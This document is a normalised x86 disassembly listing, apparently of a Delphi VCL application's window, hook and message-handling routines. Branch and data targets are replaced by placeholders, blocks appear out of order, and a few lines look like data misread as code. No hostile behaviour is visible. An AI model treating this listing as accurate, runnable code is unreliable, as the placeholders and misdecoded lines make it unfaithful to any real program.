call sub_473508
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_418dc4
mov dl [ ebp - 0x1 ]
call sub_473c00
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4734f4
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_418c68
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_418e40
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_418dc4
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_473ba0
test al al
je r-xdata
inc esi
sub_473efc
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_473508
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_4734f4
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_473f54
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_473efc
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_473fce
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_473db0
pop ecx
push ebp
mov al 0x2
call sub_473db0
pop ecx
push ebp
mov al 0x3
call sub_473db0
pop ecx
push ebp
mov al 0x4
call sub_473db0
pop ecx
push ebp
mov al 0x5
call sub_473db0
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4031ec
retn
sub_473fdc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_473b70
xor eax eax
push ebp
push sub_474055
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_473f54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_473b78
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_474070
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_403f7c
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_403fd0
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_4740c8
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_4740f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_476514
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_47411c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_4542c4
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_476590
sub_474178
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_475630
sub_4741bc
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_474178
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_47411c
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_474230
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_47428c
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_4742bc
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_4742e4
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_47428c
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_4742bc
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_4742bc
sub_474324
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4212ec
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403550
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_4759fc
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b7ac
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_42bb7c
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_476194
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c994
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_475bf4
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c9bc
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_4089a4
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_4041ec
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_476370
mov eax ebx
call sub_476d84
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_47462c
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_47450d
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_4035b8
mov ebx edx
mov esi eax
mov eax esi
call sub_476d94
mov [ esp + 0x4 ] esi
mov [ esp ] sub_4759fc
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_475bf4
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_476590
xor edx edx
mov eax esi
call sub_475f0c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421338
push esi
push sub_474a60
mov eax esi
call sub_4757e8
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4058a0
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_4031ec
mov eax [ esi + 0x90 ]
call sub_4031ec
mov eax [ esi + 0x98 ]
call sub_4031ec
test bl bl
jle r-xdata
call sub_422414
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_47462c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4747cd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4747d4
lea eax [ ebp - 0x2c ]
call sub_403f7c
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_474bac
call sub_42237c
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_40443c
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406d30
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_403f7c
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_4752b0
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_4752b0
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_4747dc
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_473510
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_47483c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_418c68
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_45c380
cmp ebx eax
je r-xdata
sub_4748ac
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_47483c
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_418dc4
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_4749c4
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_418dc4
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_474a60
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40cc5c
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_473a1c
mov eax [ rw-data ]
call sub_474064
sub_474ab8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_474b15
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474b1c
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_404174
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_474b24
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_474b60
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4752b0
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_474bac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_475266
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_474a60
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_475ccc
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_418dc4
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_45c380
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_476c48
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_4757e8
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_47578c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_45c380
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4752b0
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_474064
push ebp
call sub_474b24
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_474b24
pop ecx
jmp [ eax * 4 + jump_table_474c50 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_45c380
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_475664
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460cf8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_474ab8
push ebp
call sub_474b24
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_474b24
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_474b24
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_42114c
jmp r-xdata
xor eax eax
call sub_46c9c8
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_45c380
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_456c00
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4752cc
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_474b24
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
